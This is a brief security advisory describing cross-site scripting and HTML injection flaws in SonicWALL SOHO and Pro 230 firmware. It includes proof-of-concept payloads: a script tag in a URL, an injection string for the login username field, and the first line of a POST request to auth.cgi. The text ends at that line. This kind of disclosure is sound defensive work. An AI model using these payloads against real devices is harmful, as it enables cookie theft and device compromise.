Multiple remote input validation vulnerabilities affect SonicWALL SOHO. These issues are due to a failure of the application to properly sanitize user-supplied input prior to including it in dynamically generated Web content.

Specifically a cross-site scripting issue and an HTML injection issue affect the vulnerable device.

An attacker may leverage these issues to have arbitrary script code executed in the browser of an unsuspecting user. This may facilitate the theft of cookie-based authentication credentials as well as other attacks, potentially leading to a compromise of the affected device.

SonicWALL Pro 230 firmware 6.5.0.3 is reported vulnerable to these issues as well.

http://www.example.com/<script>alert("Its not magic... its a sonic")</script>

To leverage the HTML injection issue enter the following into the 'username' field of the login form:

</TD><script>alert("!")</script>

It is also possible to leverage the HTML injection issue by submitting the following POST request:

POST http://192.168.168.168:80/auth.cgi HTTP/1.0
